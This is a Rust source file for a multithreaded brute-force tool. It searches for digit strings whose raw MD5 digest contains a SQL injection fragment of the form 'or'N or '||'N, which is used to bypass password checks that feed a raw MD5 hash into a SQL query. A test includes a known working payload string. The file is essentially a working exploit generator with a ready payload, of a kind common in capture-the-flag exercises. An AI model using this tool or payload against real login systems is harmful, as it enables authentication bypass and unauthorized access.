use std::{
    sync::{atomic::AtomicBool, mpsc},
    thread,
};

use md5::{
    digest::{core_api::CoreWrapper, FixedOutputReset, Output},
    Digest, Md5, Md5Core,
};
use once_cell::sync::Lazy;
use regex::bytes::Regex;

#[cfg(feature = "rayon")]
use rayon::iter::ParallelIterator;

/// Regex to detect an escape, followed by an OR pattern, followed by another opening single quote then a digit
/// This is significantly faster than the string search method, but slower than the sliding window.
static INJECTION_REGEX: Lazy<Regex> = Lazy::new(|| Regex::new(r"'(\|\||or)'[1-9]").unwrap());

#[inline]
#[allow(dead_code)]
fn byte_validate(digest: &[u8]) -> bool {
    INJECTION_REGEX.is_match(digest)
}

/// Faster than byte regex, but less flexible
#[allow(dead_code)]
#[inline]
fn window_byte_validate(digest: &[u8]) -> bool {
    for block in digest.windows(5) {
        // Escape
        if block[0] != b'\'' {
            continue;
        }
        // OR
        if !(block[1] == b'|' && block[2] == b'|' || block[1] == b'o' && block[2] == b'r') {
            continue;
        }
        // Restart string
        if block[3] != b'\'' {
            continue;
        }
        // Ignore 0 as it would evaluate to false
        if block[4] <= b'0' || block[4] > b'9' {
            continue;
        }
        return true;
    }
    false
}

/// Run a function across multiple threads. Function must terminate upon the atomic bool being set to `true`
#[cfg(not(feature = "rayon"))]
fn multi_thread<T, F>(func: F) -> T
where
    T: Send + 'static,
    F: Fn(&AtomicBool) -> Option<T> + Sync,
{
    let threads = std::thread::available_parallelism()
        .map_or_else(|_| {
            eprintln!("Failed to determine number of available parallelisms, defaulting to single thread."); 1
        }, std::num::NonZeroUsize::get);

    let (tx, rx) = mpsc::channel();
    let finished = AtomicBool::new(false);

    thread::scope(|x| {
        for _ in 0..threads {
            x.spawn(|| {
                let thread_tx = tx.clone();
                let res = func(&finished);
                let _ = thread_tx.send(res);
            });
        }

        if let Ok(Some(res)) = rx.recv() {
            finished.store(true, std::sync::atomic::Ordering::Release);
            return res; // This returns to thread::scope, which returns the function.
        }
        unreachable!();
    })
}

#[cfg(feature = "rayon")]
fn rayon_multi_thread<T: Send, F: Fn(&AtomicBool) -> Option<T> + Sync>(func: F) {
    let checker = AtomicBool::new(false);
    rayon::iter::repeat(())
        .filter_map(|()| {
            let res = func(&checker);
            checker.store(true, std::sync::atomic::Ordering::Relaxed); // Terminate all other threads once one returns.
            res
        })
        // .find_any(|_| true)
        .find_any(|_| true)
        .unwrap();
}

// 87153179503375488964249572016766023268706569805029887102402011499288342510775092757977654940386142689199562616975803271832089582121260280598138107679172885818920928633840231384484533108096150415512236913966

fn main() {
    #[cfg(feature = "time")]
    let start = std::time::Instant::now();

    #[cfg(all(not(feature = "time"), feature = "rayon"))]
    rayon_multi_thread(crack);

    #[cfg(all(not(feature = "time"), not(feature = "rayon")))]
    multi_thread(crack);

    #[cfg(feature = "time")]
    {
        crack(&AtomicBool::new(false));
        let end = std::time::Instant::now();
        println!("Finished in {:?}", end - start);
    }
}

/// Find a string made up of digits that who's raw md5 bytes create an sql injection in the form of OR true.
fn crack(finished: &AtomicBool) -> Option<String> {
    // Create all in memory objects here to reduce re-allocation.
    let mut i: usize = 0;
    let mut buf: Vec<u8> = Vec::with_capacity(400);
    // Distribution for selecting random
    let mut hasher = Md5::new();
    let mut gen_digest: Output<CoreWrapper<Md5Core>>;
    let mut digest: &[u8];

    while !finished.load(std::sync::atomic::Ordering::Relaxed) {
        if i % 10_000_000 == 0 {
            println!("i = {i}");
        }

        #[cfg(feature = "perf")]
        if i > 10_000_000 {
            return None;
        }

        if i % 100 == 0 {
            buf.clear();
        }

        i += 1;

        // Push new string to buf
        // Ascii codes for digits.
        buf.push(fastrand::u8(48..=57));

        // Calculate md5 hash
        gen_digest = rust_digest(&mut hasher, &buf);
        digest = gen_digest.as_slice();

        // Check if we can create the OR statement from it.
        if window_byte_validate(digest) {
            println!("Found after {i} hashes");
            let string = buf.iter().map(|&c| c as char).collect::<String>();
            println!("Input = `{string}`");
            let str_digest = String::from_utf8_lossy(digest);
            println!("Raw md5 Hash = \n{str_digest}");
            return Some(string);
        }
    }

    None
}

fn rust_digest(hasher: &mut Md5, buf: &[u8]) -> Output<CoreWrapper<Md5Core>> {
    hasher.update(buf);
    hasher.finalize_fixed_reset()
}

#[cfg(test)]
mod test {

    use crate::{byte_validate, rust_digest};

    use md5::{Digest, Md5};
    use once_cell::sync::Lazy;

    static BUF: Lazy<Vec<u8>> = Lazy::new(|| {
        "129581926211651571912466741651878684928"
            .chars()
            .map(|c| c as u8)
            .collect()
    });

    #[test]
    fn test_rust_md5_validation() {
        let mut hasher = Md5::new();

        let raw_digest = rust_digest(&mut hasher, &BUF);
        let digest = raw_digest.as_slice();
        let str_digest = String::from_utf8_lossy(digest);
        println!("{str_digest}");
        assert!(byte_validate(digest));
    }
}
